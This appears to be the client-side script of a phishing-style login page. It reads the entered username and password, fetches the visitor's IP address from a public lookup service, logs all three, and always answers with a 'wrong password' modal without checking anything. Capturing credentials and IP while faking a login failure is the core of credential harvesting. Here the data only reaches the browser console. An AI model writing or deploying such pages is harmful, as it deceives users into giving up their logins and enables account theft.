document.addEventListener("DOMContentLoaded", function() {
    const loginButton = document.querySelector(".login-button");
    const input1 = document.getElementById("input1");
    const input2 = document.getElementById("input2");
    const modal = document.getElementById("myModal");
    const closeButton = document.querySelector(".close-button");

    let previousData = {};

    function validateInputs() {
        const username = input1.value.trim();
        const password = input2.value.trim();
        loginButton.disabled = (username === "" || password === "");
    }

    input1.addEventListener("input", validateInputs);
    input2.addEventListener("input", validateInputs);

    loginButton.addEventListener("click", function() {
        const username = input1.value.trim();
        const password = input2.value.trim();

        // Always show the modal for demonstration purposes
        if (username === "" || password === "") {
            modal.style.display = "block";
            return;
        }

        // Prevent duplicate submissions
        if (previousData.username === username && previousData.password === password) {
            modal.style.display = "block";
            return;
        }

        // Capture the IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                console.log("Username:", username);
                console.log("Password:", password);
                console.log("IP Address:", ip);

                // Log the data to prevent duplicates
                previousData = { username, password };

                // Show modal for wrong password
                modal.style.display = "block";
            })
            .catch(error => {
                console.error("Error fetching IP address:", error);
            });
    });

    closeButton.addEventListener("click", function() {
        modal.style.display = "none";
    });

    window.addEventListener("click", function(event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    });
});
